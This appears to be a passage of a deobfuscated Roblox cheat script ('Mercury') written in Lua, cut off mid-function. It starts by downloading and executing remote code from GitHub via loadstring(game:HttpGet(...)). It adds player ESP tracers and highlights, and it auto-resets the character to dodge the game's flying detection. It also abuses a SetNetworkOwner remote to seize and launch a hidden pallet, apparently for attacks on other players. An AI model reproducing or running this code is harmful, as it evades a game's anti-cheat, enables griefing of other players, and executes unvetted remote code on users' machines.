
	do
		do
			do
				local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/delivery-2347/script/refs/heads/main/soliris%20uai"))()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/Main/refs/heads/main/ScriptHub/Protect/ProtectArgsAntiSkids.luau"))()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
				_G.Library = lib

				do
					local Players = game:GetService("Players")
					local RunService = game:GetService("RunService")
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local UserInputService = game:GetService("UserInputService")
					local Workspace = game:GetService("Workspace")
					local CoreGui = game:GetService("CoreGui")
					local TweenService = game:GetService("TweenService")
					local localPlayer = Players.LocalPlayer
					local grabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
					local holdEvents = ReplicatedStorage:FindFirstChild("HoldEvents")
					local spawnToyRemoteFunction = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
					local destroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
					local stickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
					local canSpawnToy = localPlayer:FindFirstChild("CanSpawnToy") or localPlayer:WaitForChild("CanSpawnToy", 3)
					local folderName = localPlayer.Name .. "SpawnedInToys"
					_G.Players = Players
					_G.PS = Players
					_G.RS = RunService
					_G.RepS = ReplicatedStorage
					_G.UIS = UserInputService
					_G.WS = Workspace
					_G.CG = CoreGui
					_G.TS = TweenService
					_G.LP = localPlayer
					_G.CF = CFrame.new
					_G.V3 = Vector3.new
					_G.GE = grabEvents
					_G.HE = holdEvents
					_G.SpawnRemote = spawnToyRemoteFunction
					_G.DestroyRemote = destroyToy
					_G.StickyEvent = stickyPartEvent
					_G.stickyEvent = stickyPartEvent
					_G.CanSpawn = canSpawnToy
					_G.FolderName = folderName

					_G.GS = function(arg, arg2)
						return game:GetService(arg2)
					end

					_G.CreateLine = grabEvents:FindFirstChild("CreateGrabLine")
					_G.DestroyLine = grabEvents:FindFirstChild("DestroyGrabLine")
					_G.SNO = grabEvents:FindFirstChild("SetNetworkOwner")
				end

				_G.slower = string.lower
				_G.sfind = string.find
				_G.tcancel = task.cancel
				_G.tspawn = task.spawn
				_G.twait = task.wait
				_G.tdelay = task.delay
				_G.tinsert = table.insert
				_G.tclear = table.clear

				_G.PlaySound = _G.PlaySound or function(arg)
					if arg then
						arg:Stop()
						arg:Play()
					end
				end

				_G.Sounds = _G.Sounds or {}

				_G.Window = _G.Library:CreateWindow({
					Title = "Mercury Deobfuscated by HunterGuy",
					Theme = {
						Font = "Cartoon",
						ImageTransparency = 25,
						BGTransparency = 10,
						OrbsTransparency = 100,
						BackgroundID = "",
						Main = Color3.fromRGB(0, 0, 0),
						Second = Color3.fromRGB(0, 0, 0),
						ElementAccent = Color3.fromRGB(255, 255, 255),
						TextColor = Color3.fromRGB(255, 255, 255),
						GradientStart = Color3.fromRGB(255, 255, 255),
						GradientEnd = Color3.fromRGB(255, 255, 255),
						CornerRadius = 25,
						HudTransparency = 10,
					},
					ToggleKey = Enum.KeyCode.RightShift,
					Transparency = 0.5,
					ShowWatermark = { Enabled = false },
					ConfigFolder = "Mercury",
					CustomIcon = "101017996369612",
				})

				do
					local window = _G.Window
					local Visuals = window:CreateTab("Visuals", true, "7035631382")
					local v16 = window:CreateTab("Local Player", true, "16149111731")
					local Protection = window:CreateTab("Protection", true, "112583783444446")
					local Target = window:CreateTab("Target", true, "83745541516978")
					local Grabs = window:CreateTab("Grabs", true, "131943555201082")
					local Server = window:CreateTab("Server", true, "116592854241448")
					local Misc = window:CreateTab("Misc", true, "104769040369946")
					_G.VisualTab = Visuals
					_G.PlayerTab = v16
					_G.ProtectionTab = Protection
					_G.TargetTab = Target
					_G.GrabsTab = Grabs
					_G.ServerTab = Server
					_G.MiscTab = Misc
				end

				do
					local library = _G.Library
					local str5 = "101017996369612"
					local sound2 = Instance.new("Sound")
					sound2.SoundId = "rbxassetid://8578195318"
					sound2.Volume = 0.5
					sound2.Parent = game:GetService("Workspace")

					_G.Notify = function(arg, arg2, arg3)
						pcall(function()
							sound2:Stop()
							sound2:Play()
						end)

						library:Notify({ Title = arg, Content = arg2, Duration = arg3 or 5, ImageID = str5 })
					end
				end

				_G.Notify("Mercury", "Hello friend!", 5)

				task.spawn(function()
					local lp = _G.LP
					local rs = _G.RS
					local Players = game:GetService("Players")
					local Workspace = game:GetService("Workspace")
					local dataRemoteEvent = _G.RepS:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
					local coinsDisplay = lp.PlayerGui.MenuGui.TopRight.CoinsFrame.CoinsDisplay
					local coins = coinsDisplay.Coins
					local n25 = 0
					local n26 = 0
					local n27 = 0
					local n28 = 0
					local serverStatsItem = _G.GS(game, "Stats").Network:FindFirstChild("ServerStatsItem")
					local dataPing = serverStatsItem and serverStatsItem["Data Ping"]

					local function fn12()
						if dataPing then
							return math.floor(tonumber(dataPing:GetValueString():split(" ")[1]) or 0)
						end
						return 0
					end

					local flag7 = false

					local function fn13()
						if flag7 then
							return
						end
						flag7 = true
						coins.Text = string.format("FPS: %d\nPing: %dms\nCoins: %d\nKicks: %d", n25, n26, n27, n28)
						flag7 = false
					end

					coinsDisplay.CoinImage.Image = "rbxassetid://101017996369612"
					coins.TextColor3 = Color3.new(255, 255, 255)
					coins.TextXAlignment = Enum.TextXAlignment.Left

					coins:GetPropertyChangedSignal("Text"):Connect(function()
						if flag7 then
							return
						end

						if not coins.Text:find("FPS:") then
							fn13()
						end
					end)

					rs.RenderStepped:Connect(function(deltaTime)
						n25 = math.floor(1 / deltaTime)
					end)

					dataRemoteEvent.OnClientEvent:Connect(function(arg)
						if arg and arg.Money then
							n27 = arg.Money
							fn13()
						end
					end)

					task.spawn(function()
						while true do
							n26 = fn12()
							fn13()
							task.wait(1)
						end
					end)

					task.spawn(function()
						while true do
							dataRemoteEvent:FireServer()
							task.wait(1)
						end
					end)

					task.spawn(function()
						local lp2 = _G.LP or Players.LocalPlayer
						local ws = _G.WS or Workspace
						local ps = _G.PS or Players
						local tbl5 = {}

						local function fn14()
							local players = ps:GetPlayers()

							for i = 1, #players do
								local v16 = players[i]

								if v16 ~= lp2 then
									local character = v16.Character

									if character then
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										local humanoid = character:FindFirstChild("Humanoid")

										if humanoidRootPart and humanoidRootPart.Anchored and humanoid and humanoid.Health > 0 then
											if not tbl5[v16] then
												tbl5[v16] = true
												n28 += 1
												fn13()
											end
										else
											tbl5[v16] = nil
										end
									end
								end
							end
						end

						while true do
							local flag8 = false

							for _, child in ipairs(ws:GetChildren()) do
								if child.Name == "BlackHoleKick" or child.Name == "BlackHole" then
									flag8 = true
									break
								end
							end

							if flag8 then
								fn14()
							end

							task.wait(0.2)
						end
					end)
				end)

				do
					local Players = game:GetService("Players")
					local RunService = game:GetService("RunService")
					local Workspace = game:GetService("Workspace")
					local lp = _G.LP or Players.LocalPlayer
					local ws = _G.WS or Workspace
					local rs = _G.RS or RunService
					local ps = _G.PS or Players
					local n25 = 15
					local n26 = 15
					local n27 = 15
					local n28 = 25
					local tbl5 = {}
					local tbl6 = {}
					local tbl7 = {}
					local tbl8 = {}

					local ok, result = pcall(function()
						return Drawing.new
					end)

					local function fn12(color)
						if not ok then
							return nil
						end
						local ok2, result2 = pcall(result, "Line")
						if not ok2 or not result2 then
							return nil
						end
						result2.Visible = false
						result2.Color = color or Color3.fromRGB(255, 255, 255)
						result2.Thickness = 1
						result2.Transparency = 1
						return result2
					end

					local function fn13(arg)
						local v16 = tbl7[arg]
						if not v16 then
							return
						end

						if v16.tracer and v16.tracer.Remove then
							pcall(function()
								v16.tracer:Remove()
							end)
						end

						if v16.gui and v16.gui.Parent then
							v16.gui:Destroy()
						end

						if v16.part and v16.part.Parent then
							v16.part:Destroy()
						end

						tbl7[arg] = nil
					end

					local function fn14()
						local n29 = 0

						for k in pairs(tbl7) do
							n29 += 1
						end

						if n29 <= n28 then
							return
						end
						local expire = nil
						local v16 = nil

						for k, v17 in pairs(tbl7) do
							if not expire or v17.expire < expire then
								expire = v17.expire
								v16 = k
							end
						end

						if v16 then
							fn13(v16)
						end
					end

					local function fn15(text, arg, arg2)
						local part2 = Instance.new("Part")
						part2.Name = arg2 and "KickPlayerMarker" or "LeftPlayerMarker"
						part2.Size = Vector3.new(0.05, 0.05, 0.05)
						part2.Transparency = 1
						part2.Anchored = true
						part2.CanCollide = false
						part2.Parent = Workspace
						local billboardGui = Instance.new("BillboardGui")
						billboardGui.Name = arg2 and "KickPlayerGui" or "LeftPlayerGui"
						billboardGui.Adornee = part2
						billboardGui.AlwaysOnTop = true
						billboardGui.Size = UDim2.new(0, 140, 0, 160)
						billboardGui.StudsOffset = Vector3.zero
						billboardGui.MaxDistance = math.huge
						billboardGui.Parent = part2
						local frame2 = Instance.new("Frame")
						frame2.Size = UDim2.new(1, 0, 1, 0)
						frame2.BackgroundTransparency = 1
						frame2.Parent = billboardGui
						local textLabel = Instance.new("TextLabel")
						textLabel.Size = UDim2.new(1, 0, 0, 24)
						textLabel.Position = UDim2.new(0, 0, 0, 0)
						textLabel.BackgroundTransparency = 1
						textLabel.Text = text
						textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
						textLabel.TextStrokeTransparency = 0
						textLabel.Font = Enum.Font.GothamBold
						textLabel.TextSize = 13
						textLabel.Parent = frame2
						local textLabel2 = Instance.new("TextLabel")
						textLabel2.Size = UDim2.new(1, 0, 0, 20)
						textLabel2.Position = UDim2.new(0, 0, 0, 16.85)
						textLabel2.BackgroundTransparency = 1
						textLabel2.Text = ""
						textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
						textLabel2.TextStrokeTransparency = 0
						textLabel2.Font = Enum.Font.GothamBold
						textLabel2.TextSize = 12
						textLabel2.Parent = frame2
						local imageLabel = Instance.new("ImageLabel")
						imageLabel.Size = UDim2.new(0, 70, 0, 70)
						imageLabel.Position = UDim2.new(0.5, -35, 0, 28)
						imageLabel.BackgroundTransparency = 1
						imageLabel.Image = arg2 and "rbxassetid://70964139626759" or "rbxassetid://9405925508"
						imageLabel.Parent = frame2
						return part2, billboardGui, textLabel2
					end

					local function fn16(arg)
						local character = arg.Character
						if not character then
							return
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						local position = humanoidRootPart and humanoidRootPart.Position or Vector3.zero
						local highlight = Instance.new("Highlight")
						highlight.Name = "BlackHoleHighlight"
						highlight.Adornee = character
						highlight.FillColor = Color3.fromRGB(255, 255, 255)
						highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
						highlight.FillTransparency = 0
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.Parent = character
						local v16, v17, v18 = fn15("Kicked: " .. (arg.DisplayName or arg.Name) .. " | " .. arg.Name, 15, true)
						v16.CFrame = CFrame.new(position) * CFrame.new(0, 2, 0)
						local v19 = fn12(Color3.fromRGB(0, 0, 0))

						local tbl9 = {
							player = arg,
							name = arg.Name,
							targetPosition = position,
							expire = tick() + n25,
							highlight = highlight,
							part = v16,
							gui = v17,
							bottomLabel = v18,
							tracer = v19,
						}

						table.insert(tbl6, tbl9)
						local v20 = tbl5[arg.Name]
						local now2 = tick()

						if not v20 or now2 - v20 >= n27 then
							tbl5[arg.Name] = now2

							if _G.Notify then
								_G.Notify("Kick Player", arg.Name .. " | " .. (arg.DisplayName or arg.Name) .. " was kicked!", 15)
							end
						end

						task.delay(15, function()
							for i = #tbl6, 1, -1 do
								if tbl6[i] == tbl9 then
									if tbl9.tracer and tbl9.tracer.Remove then
										pcall(function()
											tbl9.tracer:Remove()
										end)
									end

									if tbl9.highlight and tbl9.highlight.Parent then
										tbl9.highlight:Destroy()
									end

									if tbl9.gui and tbl9.gui.Parent then
										tbl9.gui:Destroy()
									end

									if tbl9.part and tbl9.part.Parent then
										tbl9.part:Destroy()
									end

									table.remove(tbl6, i)
									break
								end
							end
						end)
					end

					local function fn17()
						local players = ps:GetPlayers()

						for i = 1, #players do
							local v16 = players[i]

							if v16 ~= lp then
								local character = v16.Character

								if character then
									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
									local humanoid = character:FindFirstChild("Humanoid")

									if humanoidRootPart and humanoidRootPart.Anchored and humanoid and humanoid.Health > 0 then
										local flag7 = false

										for _, v17 in ipairs(tbl6) do
											if v17.player == v16 then
												flag7 = true
												break
											end
										end

										if not flag7 then
											fn16(v16)
										end
									end
								end
							end
						end
					end

					task.spawn(function()
						for _, child in ipairs(ws:GetChildren()) do
							if child.Name == "BlackHoleKick" or child.Name == "BlackHole" then
								fn17()
								break
							end
						end

						ws.ChildAdded:Connect(function(child)
							if child.Name == "BlackHoleKick" or child.Name == "BlackHole" then
								fn17()
							end
						end)
					end)

					local function fn18(arg, arg2, arg3, arg4)
						if not arg then
							return
						end

						if tbl7[arg] then
							fn13(arg)
						end

						arg4 = arg4 or Vector3.zero
						fn14()
						local v16, v17, v18 = fn15("Leave: " .. (arg2 or arg3 or "") .. " | " .. (arg3 or ""), 15, false)
						v16.CFrame = CFrame.new(arg4) * CFrame.new(0, 2, 0)

						tbl7[arg] = {
							part = v16,
							gui = v17,
							bottomLabel = v18,
							tracer = fn12(Color3.fromRGB(255, 255, 255)),
							expire = tick() + n26,
						}
					end

					local function fn19(player)
						if not player or player == lp then
							return
						end
						tbl8[player.Name] = nil

						if tbl7[player.Name] then
							fn13(player.Name)
						end

						player.CharacterRemoving:Connect(function(character)
							local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart then
								tbl8[player.Name] = humanoidRootPart.Position
							end
						end)

						player.CharacterAdded:Connect(function()
							if tbl7[player.Name] then
								fn13(player.Name)
							end

							tbl8[player.Name] = nil
						end)
					end

					for _, player in ipairs(ps:GetPlayers()) do
						fn19(player)
					end

					ps.PlayerAdded:Connect(fn19)

					ps.PlayerRemoving:Connect(function(player)
						if player == lp then
							return
						end
						local flag7 = false

						for _, v16 in ipairs(tbl6) do
							if v16.name == player.Name or v16.player == player then
								flag7 = true
								break
							end
						end

						if not flag7 then
							local position = tbl8[player.Name]

							if not position and player.Character then
								local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart then
									position = humanoidRootPart.Position
								end
							end

							if position then
								fn18(player.Name, player.DisplayName, player.Name, position)
							end
						end

						tbl8[player.Name] = nil
					end)

					rs.RenderStepped:Connect(function()
						local currentCamera = Workspace.CurrentCamera or workspace.CurrentCamera
						local humanoidRootPart = lp and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
						local now2 = tick()

						for i = #tbl6, 1, -1 do
							local v16 = tbl6[i]
							local n29 = math.max(0, math.ceil(v16.expire - now2))

							if v16.bottomLabel and v16.bottomLabel.Parent then
								v16.bottomLabel.Text = "Expires in: " .. tostring(n29) .. "s"
							end

							if v16.tracer and currentCamera and v16.part and v16.part.Parent then
								local position = humanoidRootPart and humanoidRootPart.Position or currentCamera.CFrame.Position
								local n30 = v16.part.Position + Vector3.new(0, -0.3, 0)
								local v17 = currentCamera:WorldToViewportPoint(position)
								local v18 = currentCamera:WorldToViewportPoint(n30)

								if v17.Z > 0 and v18.Z > 0 then
									pcall(function()
										v16.tracer.From = Vector2.new(v17.X, v17.Y)
										v16.tracer.To = Vector2.new(v18.X, v18.Y)
										v16.tracer.Visible = true
									end)
								else
									pcall(function()
										v16.tracer.Visible = false
									end)
								end
							end
						end

						for k, v16 in pairs(tbl7) do
							local n29 = math.max(0, math.ceil(v16.expire - now2))

							if n29 <= 0 then
								fn13(k)
							else
								if v16.bottomLabel and v16.bottomLabel.Parent then
									v16.bottomLabel.Text = "Expires in: " .. tostring(n29) .. "s"
								end

								if v16.tracer and currentCamera and v16.part and v16.part.Parent then
									local position = humanoidRootPart and humanoidRootPart.Position or currentCamera.CFrame.Position
									local n30 = v16.part.Position + Vector3.new(0, -0.3, 0)
									local v17 = currentCamera:WorldToViewportPoint(position)
									local v18 = currentCamera:WorldToViewportPoint(n30)

									if v17.Z > 0 and v18.Z > 0 then
										pcall(function()
											v16.tracer.From = Vector2.new(v17.X, v17.Y)
											v16.tracer.To = Vector2.new(v18.X, v18.Y)
											v16.tracer.Visible = true
										end)
									else
										pcall(function()
											v16.tracer.Visible = false
										end)
									end
								end
							end
						end
					end)

					lp.CharacterAdded:Connect(function()
						for k in pairs(tbl7) do
							fn13(k)
						end
					end)

					if game:GetService("RunService"):IsServer() and type(game.BindToClose) == "function" then
						local ok2, result2 = pcall(function()
							game:BindToClose(function()
								for k in pairs(tbl7) do
									fn13(k)
								end
							end)
						end)

						if not ok2 then
							warn("BindToClose registration failed:", tostring(result2))
						end
					else
						local lp2 = _G.LP or game:GetService("Players").LocalPlayer

						if lp2 then
							lp2.CharacterRemoving:Connect(function()
								for k in pairs(tbl7) do
									fn13(k)
								end
							end)
						end
					end
				end

				task.spawn(function()
					local lp = _G.LP
					local str5 = lp.Name .. "SpawnedInToys"
					local tbl5 = {}
					local fn12 = nil

					fn12 = function(arg, arg2)
						if tbl5[arg] then
							return
						end
						tbl5[arg] = true
						local connection = nil

						connection = arg:GetPropertyChangedSignal("Occupant"):Connect(function()
							local occupant = arg.Occupant
							if not occupant then
								return
							end
							local parent = occupant.Parent
							if not parent or not parent:IsA("Model") then
								return
							end
							local playerFromCharacter = _G.PS:GetPlayerFromCharacter(parent)
							if not playerFromCharacter or playerFromCharacter == lp then
								return
							end
							_G.Notify("Someone sat on your toy!", "[" .. playerFromCharacter.DisplayName .. " | " .. playerFromCharacter.Name .. "] sat on your [" .. arg2 .. "]", 5)
							connection:Disconnect()
							tbl5[arg] = nil
							task.wait(1)
							fn12(arg, arg2)
						end)
					end

					local function fn13(arg)
						if not arg then
							return
						end

						for _, child in ipairs(arg:GetChildren()) do
							local vehicleSeat = child:FindFirstChildWhichIsA("VehicleSeat")

							if vehicleSeat then
								fn12(vehicleSeat, child.Name or "Unknown")
							end
						end
					end

					local function fn14(child)
						task.wait(1)
						local vehicleSeat = child:FindFirstChildWhichIsA("VehicleSeat")

						if vehicleSeat then
							fn12(vehicleSeat, child.Name or "Unknown")
						end
					end

					local v16 = workspace:FindFirstChild(str5)

					if v16 then
						fn13(v16)
						v16.ChildAdded:Connect(fn14)
					end

					workspace.ChildAdded:Connect(function(child)
						if child.Name == str5 then
							task.wait(1)
							fn13(child)
							child.ChildAdded:Connect(fn14)
						end
					end)
				end)

				task.spawn(function()
					local repS = _G.RepS
					local ps = _G.PS
					local grabEvents = repS:FindFirstChild("GrabEvents")
					_G.PacketLagDetector = _G.PacketLagDetector or { detectedPlayers = {}, activeLogs = {}, maxActive = 50, cooldown = 30 }
					local packetLagDetector = _G.PacketLagDetector

					local function fn12(arg)
						local n25 = 0

						for k in pairs(arg) do
							n25 += 1
						end

						return n25
					end

					local function fn13(arg, arg2)
						if not (typeof(arg) == "Instance" and arg:IsA("Player")) then
							if type(arg) == "string" then
								arg = ps:FindFirstChild(arg)
							else
								local players = ps:GetPlayers()
								local v16 = nil

								if #players > 0 then
									arg2 = arg
									arg = players[math.random(1, #players)]
								else
									arg2 = arg
									arg = v16
								end
							end
						end

						if not arg or typeof(arg) ~= "Instance" or not arg:IsA("Player") then
							return
						end
						local name = arg.Name
						local displayName = arg.DisplayName or name
						local maxSize, preview

						if type(arg2) == "table" then
							maxSize = 0
							preview = ""

							for _, v16 in pairs(arg2) do
								local kind = type(v16)

								if kind == "number" then
									maxSize += math.abs(v16)
								elseif kind == "string" then
									maxSize += #v16

									if preview == "" then
										preview = v16:sub(1, 30):gsub("[%c]", " ")
									end
								end
							end
						elseif type(arg2) == "number" then
							maxSize = math.abs(arg2)
							preview = tostring(arg2):sub(1, 30)
						else
							maxSize = 0
							preview = ""

							if type(arg2) == "string" then
								maxSize = #arg2
								preview = arg2:sub(1, 30):gsub("[%c]", " ")
							end
						end

						if maxSize < 1000 then
							return
						end
						local now2 = tick()
						local v16 = packetLagDetector.detectedPlayers[name]
						if v16 and now2 - v16 <= packetLagDetector.cooldown then
							return
						end
						local v17 = packetLagDetector.activeLogs[name]

						if not v17 then
							if packetLagDetector.maxActive <= fn12(packetLagDetector.activeLogs) then
								return
							end

							packetLagDetector.activeLogs[name] = {
								startTime = now2,
								last = now2,
								maxSize = maxSize,
								preview = preview,
								displayName = displayName,
								playerName = name,
								count = 1,
							}
						else
							v17.last = now2
							v17.count = (v17.count or 1) + 1

							if v17.maxSize < maxSize then
								v17.maxSize = maxSize
								v17.preview = preview
							end
						end
					end

					local function fn14()
						grabEvents = repS:FindFirstChild("GrabEvents")

						if grabEvents and grabEvents:FindFirstChild("ExtendGrabLine") then
							grabEvents.ExtendGrabLine.OnClientEvent:Connect(fn13)
						end
					end

					fn14()

					repS.ChildAdded:Connect(function(child)
						if child.Name == "GrabEvents" then
							task.wait(1)
							fn14()
						end
					end)

					task.spawn(function()
						while true do
							task.wait(1)
							local now2 = tick()

							for k, activeLog in pairs(packetLagDetector.activeLogs) do
								if now2 - activeLog.startTime >= 1 then
									packetLagDetector.activeLogs[k] = nil
									packetLagDetector.detectedPlayers[k] = now2
									local n25 = activeLog.maxSize / 1048576
									local str5 = string.format("Player: %s\nSize: %d (%.2f MB)", activeLog.playerName, math.floor(activeLog.maxSize), n25)

									if activeLog.preview ~= "" then
										str5 ..= "\nData: [" .. activeLog.preview .. "...]"
									end

									pcall(function()
										_G.Notify("Packet lag was detected!", str5, 6)
									end)
								end
							end
						end
					end)
				end)

				do
					local Players = game:GetService("Players")
					local localPlayer = Players.LocalPlayer
					local tbl5 = {}

					local function fn12(arg, arg2)
						if not arg2 then
							return
						end
						local humanoidRootPart = arg2:FindFirstChild("HumanoidRootPart") or arg2:WaitForChild("HumanoidRootPart", 3)
						if not humanoidRootPart then
							return
						end

						if humanoidRootPart.Massless then
							humanoidRootPart.Massless = false
						end

						tbl5[arg] = humanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
							if humanoidRootPart.Massless then
								humanoidRootPart.Massless = false
							end
						end)
					end

					local function fn13(player)
						if player == localPlayer then
							return
						end

						if player.Character then
							fn12(player, player.Character)
						end

						player.CharacterAdded:Connect(function(character)
							fn12(player, character)
						end)
					end

					local players = Players:GetPlayers()

					for i = 1, #players do
						fn13(players[i])
					end

					Players.PlayerAdded:Connect(fn13)

					Players.PlayerRemoving:Connect(function(player)
						if tbl5[player] then
							tbl5[player]:Disconnect()
							tbl5[player] = nil
						end
					end)
				end

				game:GetService("Workspace")
				local gameCorrectionEvents = _G.RepS:FindFirstChild("GameCorrectionEvents")

				if gameCorrectionEvents then
					local gameCorrectionsNotify = gameCorrectionEvents:FindFirstChild("GameCorrectionsNotify")

					if gameCorrectionsNotify and gameCorrectionsNotify:IsA("RemoteEvent") then
						local tbl5 = {}
						local lp = _G.LP

						gameCorrectionsNotify.OnClientEvent:Connect(function(arg)
							if arg ~= "Flying" then
								return
							end
							local character = lp.Character
							character = character and character:FindFirstChild("Humanoid")
							if not character then
								return
							end
							character.Health = 0
							_G.Notify("Flying detected", "Auto reset to avoid kick!", 5)
							local now2 = tick()
							tbl5[#tbl5 + 1] = now2

							for i = #tbl5, 1, -1 do
								if now2 - tbl5[i] > 2 then
									table.remove(tbl5, i)
								end
							end

							if #tbl5 >= 3 then
								task.wait()
								lp:Kick("You have been saved from being kicked :]")
							end
						end)
					end
				end

				if not _G.LP then
					return
				end

				if not _G.WS then
					return
				end

				if not _G.SpawnRemote then
					return
				end

				if not _G.DestroyRemote then
					return
				end

				if not _G.SNO then
					return
				end
				_G.States = _G.States or {}

				_G.States.PermanentPallet = _G.States.PermanentPallet or {
					enabled = false,
					currentPallet = nil,
					connection = nil,
					thread = nil,
					ownerhipActive = false,
					ownerhipCheckConnection = nil,
					myPalletId = nil,
					isSpawning = false,
					isAttached = false,
				}

				do
					local permanentPallet = _G.States.PermanentPallet

					local function fn12(arg)
						if not arg then
							return
						end

						for _, descendant in ipairs(arg:GetDescendants()) do
							if descendant:IsA("BasePart") then
								if descendant.Transparency ~= 1 then
									descendant.Transparency = 1
								end

								descendant.CanCollide = false
								descendant.CanQuery = false
							end
						end
					end

					local function fn13(arg)
						if not arg then
							return
						end
						local pallet = arg:FindFirstChild("Pallet") or arg:FindFirstChildWhichIsA("BasePart")

						if pallet then
							pallet.CFrame = CFrame.new(0, 100000000, 0)
						end
					end

					local function fn14(arg)
						if not arg then
							return
						end

						pcall(function()
							_G.DestroyRemote:FireServer(arg)
						end)
					end

					local function checkOwnership(arg)
						if not arg then
							return false
						end
						local soundPart = arg:FindFirstChild("SoundPart")
						if not soundPart then
							return false
						end
						local partOwner = soundPart:FindFirstChild("PartOwner")

						if partOwner then
							if partOwner.Value == _G.LP.Name then
								return true
							end

							if partOwner.Value ~= "" then
								fn14(arg)
								return false
							end
						end

						return false
					end

					local function takeOwnership(arg)
						if not arg then
							return false
						end
						local soundPart = arg:FindFirstChild("SoundPart")
						if not soundPart then
							return false
						end

						while true do
							pcall(function()
								_G.SNO:FireServer(soundPart, soundPart.CFrame)
							end)

							task.wait(0.3)
							local partOwner = soundPart:FindFirstChild("PartOwner")
							if not partOwner then
								continue
							end

							if partOwner.Value == _G.LP.Name then
								fn12(arg)
								return true
							end

							if partOwner.Value == "" then
								continue
							end
							break
						end

						fn14(arg)
						return false
					end

					local function fn15(arg)
						if not arg then
							return nil
						end
						return arg:FindFirstChild("Pallet") or arg:FindFirstChildWhichIsA("BasePart")
					end

					local function fn16(arg)
						local v16 = fn15(arg)
						if not v16 then
							return nil
						end
						local character = _G.LP.Character
						character = character and character:FindFirstChild("HumanoidRootPart")
						if not character then
							return nil
						end
						return (v16.Position - character.Position).Magnitude
					end

					local function forcePallet(currentPallet)
						if not currentPallet then
							return
						end
						permanentPallet.currentPallet = currentPallet
						permanentPallet.isAttached = false

						if permanentPallet.connection then
							permanentPallet.connection:Disconnect()
							permanentPallet.connection = nil
						end

						fn12(currentPallet)
						fn13(currentPallet)

						currentPallet.DescendantAdded:Connect(function(descendant)
							if descendant:IsA("BasePart") then
								descendant.Transparency = 1
								descendant.CanCollide = false
								descendant.CanQuery = false
							end
						end)

						local n25 = 0

						permanentPallet.connection = game:GetService("RunService").Heartbeat:Connect(function()
							if not permanentPallet.enabled then
								return
							end

							if not currentPallet or not currentPallet.Parent then
								permanentPallet.currentPallet = nil
								permanentPallet.myPalletId = nil

								if permanentPallet.connection then
									permanentPallet.connection:Disconnect()
									permanentPallet.connection = nil
								end

								return
							end

							local soundPart = currentPallet:FindFirstChild("SoundPart")
							if not soundPart then
								return
							end

							if os.clock() - n25 > 0.15 then
								n25 = os.clock()
								if not checkOwnership(currentPallet) then
									takeOwnership(currentPallet)
									return
								end
							end

							fn12(currentPallet)
							soundPart.AssemblyLinearVelocity = Vector3.new(0, 100000000, 0)
							soundPart.AssemblyAngularVelocity = Vector3.zero
							permanentPallet.isAttached = true
						end)
					end

					local function fn17()
						local response

						while true do
							local canSpawnToy = _G.LP:FindFirstChild("CanSpawnToy")

							while not canSpawnToy or not canSpawnToy.Value do
								task.wait(0.25)
							end

							local character = _G.LP.Character

							while not character do
								task.wait(0.25)
								character = _G.LP.Character
							end

							local head = character:FindFirstChild("Head")

							while not head do
								task.wait(0.25)
								head = character:FindFirstChild("Head")
							end

							local n25 = head.CFrame * CFrame.new(0, 25, 20)
							response = nil
							local flag7 = false

							while not flag7 do
								pcall(function()
									response = _G.SpawnRemote:InvokeServer("PalletLightBrown", n25, Vector3.new(0, -90, 0))

									if response then
										flag7 = true
									end
								end)

								if not flag7 then
									task.wait(0.5)
								end
							end

							if not response then
								task.wait(0.25)
								continue
							end
							local v16 = fn16(response)

							if v16 and v16 > 30 then
								fn14(response)
								task.wait(0.25)
								task.wait(0.25)
								continue
							end

							break
						end

						permanentPallet.myPalletId = response
						fn12(response)
						fn13(response)
						return response
					end

					local function fn18()
						while permanentPallet.enabled do
							if permanentPallet.currentPallet and permanentPallet.currentPallet.Parent then
								task.wait(0.5)

								while permanentPallet.currentPallet and permanentPallet.currentPallet.Parent do
									task.wait(0.5)
								end
							end

							local canSpawnToy = _G.LP:FindFirstChild("CanSpawnToy")

							if canSpawnToy and canSpawnToy.Value then
								local v16 = fn17()

								if v16 then
									takeOwnership(v16)
									forcePallet(v16)
								end
							end

							task.wait(0.5)
						end
					end

					local function startPermanentPallet()
						if permanentPallet.enabled then
							return
						end
						permanentPallet.enabled = true
						permanentPallet.isAttached = false

						if permanentPallet.thread then
							permanentPallet.thread = nil
						end

						permanentPallet.thread = task.spawn(function()
							while permanentPallet.enabled do
								while not _G.LP.Character do
									task.wait(0.25)
								end

								local str5 = _G.LP.Name .. "SpawnedInToys"
								local v16 = _G.WS:FindFirstChild(str5)

								while not v16 do
									task.wait(0.25)
									v16 = _G.WS:FindFirstChild(str5)
								end

								while permanentPallet.currentPallet and not permanentPallet.currentPallet.Parent do
									permanentPallet.currentPallet = nil
									permanentPallet.myPalletId = nil
									permanentPallet.isAttached = false
									task.wait(0.25)
								end

								while permanentPallet.currentPallet and permanentPallet.currentPallet.Parent do
									if not checkOwnership(permanentPallet.currentPallet) then
										takeOwnership(permanentPallet.currentPallet)
									else
										fn12(permanentPallet.currentPallet)
									end

									task.wait(0.15)
								end

								task.spawn(function()
									fn18()
								end)

								task.wait(0.5)
							end
						end)
					end

					local function stopPermanentPallet()
						permanentPallet.enabled = false
						permanentPallet.isAttached = false

						while permanentPallet.thread do
							permanentPallet.thread = nil
							task.wait(0.1)
						end

						while permanentPallet.connection do
							permanentPallet.connection:Disconnect()
							permanentPallet.connection = nil
